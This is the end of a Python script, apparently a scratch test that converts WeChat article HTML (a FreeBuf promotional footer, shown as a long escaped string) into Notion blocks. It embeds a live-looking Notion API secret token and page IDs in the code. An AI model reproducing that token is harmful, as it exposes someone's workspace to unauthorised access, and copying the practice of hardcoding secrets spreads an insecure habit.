Sans GB\", \"Microsoft YaHei UI\", \"Microsoft YaHei\", Arial, sans-serif;font-size: 16px;letter-spacing: 0.544px;text-align: center;caret-color: rgb(51, 51, 51);background-color: rgb(255, 255, 255);max-inline-size: 100%;overflow-wrap: break-word !important;box-sizing: border-box !important;outline: none 0px !important;'><section data-id=\"94332\" data-tools=\"135\u7f16\u8f91\u5668\" style=\"max-width: 100%;max-inline-size: 100%;border-width: 0px;border-style: none;border-color: initial;z-index: 0;min-width: 90px;overflow-wrap: break-word !important;box-sizing: border-box !important;outline: none 0px !important;\"><section data-width=\"100%\" style=\"max-width: 100%;max-inline-size: 100%;width: 578px;overflow-wrap: break-word !important;box-sizing: border-box !important;outline: none 0px !important;\"><section style=\"max-width: 100%;max-inline-size: 100%;overflow-wrap: break-word !important;box-sizing: border-box !important;outline: none 0px !important;\"><section style=\"max-width: 100%;max-inline-size: 100%;width: 4em;display: inline-block;overflow-wrap: break-word !important;box-sizing: border-box !important;outline: none 0px !important;\"><img class=\"__bg_gif\" data-ratio=\"0.3208955223880597\" data-src=\"https://mmbiz.qpic.cn/mmbiz_gif/qq5rfBadR38Tm7G07JF6t0KtSAuSbyWtgFA8ywcatrPPlURJ9sDvFMNwRT0vpKpQ14qrYwN2eibp43uDENdXxgg/640?wx_fmt=gif\" data-type=\"gif\" data-w=\"134\" style=\"max-inline-size: 100%;display: block;inset: auto;overflow-wrap: break-word !important;box-sizing: border-box !important;outline: none 0px !important;visibility: visible !important;width: 4em !important;\"/></section></section></section></section></section><p style='white-space: normal;max-width: 100%;min-height: 1em;font-family: -apple-system-font, BlinkMacSystemFont, \"Helvetica Neue\", \"PingFang SC\", \"Hiragino Sans GB\", \"Microsoft YaHei UI\", \"Microsoft YaHei\", Arial, sans-serif;font-size: 16px;letter-spacing: 0.544px;text-align: center;caret-color: rgb(51, 51, 51);background-color: rgb(255, 255, 255);max-inline-size: 100%;cursor: text;overflow-wrap: break-word !important;box-sizing: border-box !important;outline: none 0px !important;'><mp-miniprogram data-miniprogram-appid=\"wx296d05e02af76531\" data-miniprogram-avatar=\"http://mmbiz.qpic.cn/mmbiz_png/3Uce810Z1ibJ71wq8iaokyw684qmZXrhOEkB72dq4AGTwHmHQHAcuZ7DLBvSlxGyEC1U21UMgSKOxDGicUBM7icWHQ/640?wx_fmt=png\" data-miniprogram-imageurl=\"http://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibLOEAnkkKa2dHtqcjZ55KLbnyJicITrq1sA1fG6PJLC2Y4X7xL0Hkx6RsMJgeuDUicUDrU299aTl4A/0?wx_fmt=jpeg\" data-miniprogram-nickname=\"FreeBuf+\" data-miniprogram-path=\"pages/article/search/main\" data-miniprogram-servicetype=\"0\" data-miniprogram-title=\"FreeBuf+\u5c0f\u7a0b\u5e8f\uff1a\u628a\u5b89\u5168\u88c5\u8fdb\u53e3\u888b\" data-miniprogram-type=\"card\"></mp-miniprogram></p><section style='white-space: normal;max-width: 100%;font-family: -apple-system-font, BlinkMacSystemFont, \"Helvetica Neue\", \"PingFang SC\", \"Hiragino Sans GB\", \"Microsoft YaHei UI\", \"Microsoft YaHei\", Arial, sans-serif;font-size: 16px;letter-spacing: 0.544px;text-align: center;caret-color: rgb(51, 51, 51);background-color: rgb(255, 255, 255);max-inline-size: 100%;overflow-wrap: break-word !important;box-sizing: border-box !important;outline: none 0px !important;'><section data-id=\"89430\" data-tools=\"135\u7f16\u8f91\u5668\" style=\"max-width: 100%;max-inline-size: 100%;border-width: 0px;border-style: none;border-color: rgb(51, 136, 63);z-index: 0;min-width: 90px;overflow-wrap: break-word !important;box-sizing: border-box !important;outline: none 0px !important;\"><section style=\"padding: 10px;max-width: 100%;max-inline-size: 100%;overflow-wrap: break-word !important;box-sizing: border-box !important;outline: none 0px !important;\"><section style=\"max-width: 100%;max-inline-size: 100%;overflow-wrap: break-word !important;box-sizing: border-box !important;outline: none 0px !important;\"><section style=\"max-width: 100%;max-inline-size: 100%;line-height: 25.6px;overflow-wrap: break-word !important;box-sizing: border-box !important;outline: none 0px !important;\"><section style=\"max-width: 100%;max-inline-size: 100%;width: 30px;height: 2px;display: inline-block;vertical-align: middle;background: none 0% 0% repeat scroll rgb(51, 136, 63);overflow-wrap: break-word !important;box-sizing: border-box !important;outline: none 0px !important;\"><br style=\"max-width: 100%;max-inline-size: 100%;overflow-wrap: break-word !important;box-sizing: border-box !important;outline: none 0px !important;\"/></section><section style=\"margin-right: 10px;margin-left: 10px;max-width: 100%;max-inline-size: 100%;display: inline-block;vertical-align: middle;overflow-wrap: break-word !important;box-sizing: border-box !important;outline: none 0px !important;\"><p style=\"max-width: 100%;min-height: 1em;max-inline-size: 100%;cursor: text;font-size: 20px;color: rgb(51, 136, 63);min-width: 1px;font-weight: bold;overflow-wrap: break-word !important;box-sizing: border-box !important;outline: none 0px !important;\">\u7cbe\u5f69\u63a8\u8350</p></section><section style=\"max-width: 100%;max-inline-size: 100%;width: 30px;height: 2px;display: inline-block;vertical-align: middle;background: none 0% 0% repeat scroll rgb(51, 136, 63);overflow-wrap: break-word !important;box-sizing: border-box !important;outline: none 0px !important;\"><br style=\"max-width: 100%;overflow-wrap: break-word !important;box-sizing: border-box !important;\"/></section></section><section style=\"margin-top: 5px;max-width: 100%;max-inline-size: 100%;line-height: 25.6px;overflow-wrap: break-word !important;box-sizing: border-box !important;outline: none 0px !important;\"><section style=\"max-width: 100%;max-inline-size: 100%;height: 4px;background: none 0% 0% repeat scroll rgb(51, 136, 63);overflow-wrap: break-word !important;box-sizing: border-box !important;outline: none 0px !important;\"><br style=\"max-width: 100%;overflow-wrap: break-word !important;box-sizing: border-box !important;\"/></section><section style=\"margin-top: -30px;max-width: 100%;max-inline-size: 100%;display: flex;justify-content: space-between;overflow-wrap: break-word !important;box-sizing: border-box !important;outline: none 0px !important;\"><section style=\"margin-left: 27.7969px;max-width: 100%;max-inline-size: 100%;width: 10px;overflow-wrap: break-word !important;box-sizing: border-box !important;outline: none 0px !important;\"><section style=\"margin-right: auto;margin-left: auto;max-width: 100%;max-inline-size: 100%;width: 2px;height: 40px;opacity: 0.7;background: none 0% 0% repeat scroll rgb(51, 136, 63);overflow-wrap: break-word !important;box-sizing: border-box !important;outline: none 0px !important;\"><br style=\"max-width: 100%;overflow-wrap: break-word !important;box-sizing: border-box !important;\"/></section><section style=\"max-width: 100%;max-inline-size: 100%;width: 10px;height: 10px;border-radius: 100%;opacity: 0.7;background: none 0% 0% repeat scroll rgb(51, 136, 63);overflow-wrap: break-word !important;box-sizing: border-box !important;outline: none 0px !important;\"><br style=\"max-width: 100%;overflow-wrap: break-word !important;box-sizing: border-box !important;\"/></section></section><section style=\"margin-right: 27.7969px;max-width: 100%;max-inline-size: 100%;width: 10px;overflow-wrap: break-word !important;box-sizing: border-box !important;outline: none 0px !important;\"><section style=\"margin-right: auto;margin-left: auto;max-width: 100%;max-inline-size: 100%;width: 2px;height: 40px;opacity: 0.7;background: none 0% 0% repeat scroll rgb(51, 136, 63);overflow-wrap: break-word !important;box-sizing: border-box !important;outline: none 0px !important;\"><strong style=\"max-width: 100%;max-inline-size: 100%;cursor: text;font-size: 15px;letter-spacing: 0.1em;color: rgb(136, 136, 136);font-family: Avenir, SimSun;overflow-wrap: break-word !important;box-sizing: border-box !important;outline: none 0px !important;\"><strong style=\"max-width: 100%;max-inline-size: 100%;cursor: text;color: rgb(0, 0, 0);overflow-wrap: break-word !important;box-sizing: border-box !important;outline: none 0px !important;\"><img data-copyright=\"0\" data-cropselx1=\"0\" data-cropselx2=\"526\" data-cropsely1=\"0\" data-cropsely2=\"165\" data-ratio=\"0.31296296296296294\" data-src=\"https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ib2xibAss1xbykgjtgKvut2LUribibnyiaBpicTkS10Asn4m4HgpknoH9icgqE0b0TVSGfGzs0q8sJfWiaFg/640?wx_fmt=jpeg\" data-type=\"jpeg\" data-w=\"1080\" style=\"max-inline-size: 100%;inset: auto;overflow-wrap: break-word !important;box-sizing: border-box !important;outline: none 0px !important;visibility: visible !important;width: 2px !important;\"/></strong></strong></section><section style=\"max-width: 100%;max-inline-size: 100%;width: 10px;height: 10px;border-radius: 100%;opacity: 0.7;background: none 0% 0% repeat scroll rgb(51, 136, 63);overflow-wrap: break-word !important;box-sizing: border-box !important;outline: none 0px !important;\"><br style=\"max-width: 100%;overflow-wrap: break-word !important;box-sizing: border-box !important;\"/></section></section></section></section></section></section></section></section><section style='white-space: normal;max-width: 100%;font-family: -apple-system-font, BlinkMacSystemFont, \"Helvetica Neue\", \"PingFang SC\", \"Hiragino Sans GB\", \"Microsoft YaHei UI\", \"Microsoft YaHei\", Arial, sans-serif;font-size: 16px;letter-spacing: 0.544px;text-align: center;caret-color: rgb(51, 51, 51);background-color: rgb(255, 255, 255);max-inline-size: 100%;overflow-wrap: break-word !important;box-sizing: border-box !important;outline: none 0px !important;'><section data-role=\"paragraph\" style=\"max-width: 100%;max-inline-size: 100%;overflow-wrap: break-word !important;box-sizing: border-box !important;outline: none 0px !important;\"><p style=\"max-width: 100%;min-height: 1em;overflow-wrap: break-word !important;box-sizing: border-box !important;\"><a data-linktype=\"1\" href=\"https://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&amp;mid=2247486586&amp;idx=1&amp;sn=8fb235328402751e06c0578e05f3c905&amp;scene=21#wechat_redirect\" tab=\"innerlink\" target=\"_blank\" textvalue=\"\u4f60\u5df2\u9009\u4e2d\u4e86\u6dfb\u52a0\u94fe\u63a5\u7684\u5185\u5bb9\"><span class=\"js_jump_icon h5_image_link\" data-positionback=\"static\" style=\"max-width: 100%;inset: auto;overflow-wrap: break-word !important;box-sizing: border-box !important;\"><img class=\"rich_pages wxw-img js_insertlocalimg\" data-backh=\"181\" data-backw=\"578\" data-cropselx1=\"0\" data-cropselx2=\"578\" data-cropsely1=\"0\" data-cropsely2=\"181\" data-ratio=\"0.31296296296296294\" data-s=\"300,640\" data-src=\"https://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR3icTJJ5BSGc7Voib9fdjibAMqP7laebImDmiah5qqVfHsxz31pJaYujO7otYXpfNzILX0v0qEMMia7wayw/640?wx_fmt=png\" data-type=\"png\" data-w=\"1080\" style=\"height: 181px;width: 578px;inset: auto;overflow-wrap: break-word !important;\"/></span></a></p><p style=\"max-width: 100%;min-height: 1em;overflow-wrap: break-word !important;box-sizing: border-box !important;\"><a data-linktype=\"1\" href=\"https://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&amp;mid=2247486561&amp;idx=1&amp;sn=6457d8dabbab2c32b19defa6f012de23&amp;scene=21#wechat_redirect\" style=\"letter-spacing: 0.544px;max-width: 100%;overflow-wrap: break-word !important;box-sizing: border-box !important;\" tab=\"innerlink\" target=\"_blank\" textvalue=\"\u4f60\u5df2\u9009\u4e2d\u4e86\u6dfb\u52a0\u94fe\u63a5\u7684\u5185\u5bb9\"><span class=\"js_jump_icon h5_image_link\" data-positionback=\"static\" style=\"max-width: 100%;inset: auto;overflow-wrap: break-word !important;box-sizing: border-box !important;\"><img class=\"rich_pages wxw-img js_insertlocalimg\" data-backh=\"181\" data-backw=\"578\" data-cropselx1=\"0\" data-cropselx2=\"578\" data-cropsely1=\"0\" data-cropsely2=\"181\" data-ratio=\"0.31296296296296294\" data-s=\"300,640\" data-src=\"https://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR3ibSgYibVIialC22ibFUX5Ppy2sGKPJJfPWJTSsher0YicjwxEX2v1LY7QiablHSRm6iarXza981MRaKdJUg/640?wx_fmt=png\" data-type=\"png\" data-w=\"1080\" style=\"height: 181px;width: 578px;inset: auto;overflow-wrap: break-word !important;\"/></span></a></p><p style=\"max-width: 100%;min-height: 1em;overflow-wrap: break-word !important;box-sizing: border-box !important;\"><a data-linktype=\"1\" href=\"https://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&amp;mid=2247486547&amp;idx=1&amp;sn=a00edc620c7544082211e20fccd8d85c&amp;scene=21#wechat_redirect\" style=\"max-width: 100%;letter-spacing: 0.544px;overflow-wrap: break-word !important;box-sizing: border-box !important;\" tab=\"innerlink\" target=\"_blank\" textvalue=\"\u4f60\u5df2\u9009\u4e2d\u4e86\u6dfb\u52a0\u94fe\u63a5\u7684\u5185\u5bb9\"><span class=\"js_jump_icon h5_image_link\" data-positionback=\"static\" style=\"max-width: 100%;inset: auto;overflow-wrap: break-word !important;box-sizing: border-box !important;\"><img class=\"rich_pages wxw-img js_insertlocalimg\" data-backh=\"181\" data-backw=\"578\" data-cropselx1=\"0\" data-cropselx2=\"578\" data-cropsely1=\"0\" data-cropsely2=\"187\" data-ratio=\"0.31296296296296294\" data-s=\"300,640\" data-src=\"https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3icU1EkOA5mhFmPcH2KjdawjWExtb0kxY0tXtUozlSQASIrxuRGVVWYnLVwN6ulGTfoCQBcjDdAF6g/640?wx_fmt=jpeg\" data-type=\"jpeg\" data-w=\"1080\" style=\"height: 181px;width: 578px;inset: auto;overflow-wrap: break-word !important;\"/></span></a></p><section style=\"max-width: 100%;letter-spacing: 0.544px;max-inline-size: 100%;overflow-wrap: break-word !important;box-sizing: border-box !important;outline: none 0px !important;\"><section data-role=\"paragraph\" style=\"max-width: 100%;max-inline-size: 100%;overflow-wrap: break-word !important;box-sizing: border-box !important;outline: none 0px !important;\"><p style=\"max-width: 100%;min-height: 1em;overflow-wrap: break-word !important;box-sizing: border-box !important;\"><strong style=\"max-width: 100%;text-align: start;cursor: text;font-size: 15px;letter-spacing: 0.1em;color: rgb(136, 136, 136);font-family: Avenir, SimSun;max-inline-size: 100%;overflow-wrap: break-word !important;box-sizing: border-box !important;outline: none 0px !important;\"><strong style=\"max-width: 100%;cursor: text;color: rgb(0, 0, 0);max-inline-size: 100%;overflow-wrap: break-word !important;box-sizing: border-box !important;outline: none 0px !important;\"><strong style=\"max-width: 100%;cursor: text;color: rgb(136, 136, 136);max-inline-size: 100%;overflow-wrap: break-word !important;box-sizing: border-box !important;outline: none 0px !important;\"><strong style=\"max-width: 100%;cursor: text;max-inline-size: 100%;overflow-wrap: break-word !important;box-sizing: border-box !important;outline: none 0px !important;\"><strong style=\"max-width: 100%;cursor: text;max-inline-size: 100%;overflow-wrap: break-word !important;box-sizing: border-box !important;outline: none 0px !important;\"><strong style=\"max-width: 100%;cursor: text;letter-spacing: 0.1em;max-inline-size: 100%;overflow-wrap: break-word !important;box-sizing: border-box !important;outline: none 0px !important;\"><strong style=\"max-width: 100%;cursor: text;letter-spacing: 0.1em;text-align: center;color: rgb(159, 163, 168);max-inline-size: 100%;overflow-wrap: break-word !important;box-sizing: border-box !important;outline: none 0px !important;\"><img class=\"__bg_gif\" data-backh=\"300\" data-backw=\"578\" data-before-oversubscription-url=\"https://mmbiz.qpic.cn/mmbiz_gif/qq5rfBadR3icF8RMnJbsqatMibR6OicVrUDaz0fyxNtBDpPlLfibJZILzHQcwaKkb4ia57xAShIJfQ54HjOG1oPXBew/?wx_fmt=gif\" data-copyright=\"0\" data-cropselx1=\"0\" data-cropselx2=\"526\" data-cropsely1=\"0\" data-cropsely2=\"164\" data-ratio=\"0.5197505197505198\" data-src=\"https://mmbiz.qpic.cn/mmbiz_gif/qq5rfBadR3icF8RMnJbsqatMibR6OicVrUDaz0fyxNtBDpPlLfibJZILzHQcwaKkb4ia57xAShIJfQ54HjOG1oPXBew/640?wx_fmt=gif\" data-type=\"gif\" data-w=\"962\" style=\"max-inline-size: 100%;width: 577.778px;overflow-wrap: break-word !important;box-sizing: border-box !important;outline: none 0px !important;visibility: visible !important;\"/></strong></strong></strong></strong></strong></strong></strong></p></section></section></section></section>\n</div>"
    from notion_client import Client

    api_token = "secret_YDYf8mo1D6QVzkIkaKeH2Db42dqOMYlGVFAYgM8Bi2E"
    test_page_id = "eb0a9c339ee64692a3a64025bd05a397"
    notion = Client(auth=api_token)
    _l = convert(x)
    # print(_l)
    # notion.blocks.children.append(test_page_id, children=_l)

    # for _x in _l:
    #     try:
    #         notion.blocks.children.append(test_page_id, children=[_x])
    #     except Exception as E:
    #         print(E)

    # print(notion.blocks.retrieve("eb0a9c339ee64692a3a64025bd05a397"))
    import pprint
    pprint.pprint(notion.blocks.retrieve("807cf01723364df9a4450466127c7819"))
    # print(notion.blocks.children.list(test_page_id))
    # https://www.notion.so/b0ne/TEST-PAGE-eb0a9c339ee64692a3a64025bd05a397#e9863229c1364059b8bf5ff6ca24df99
    # https://www.notion.so/b0ne/TEST-PAGE-eb0a9c339ee64692a3a64025bd05a397#807cf01723364df9a4450466127c7819
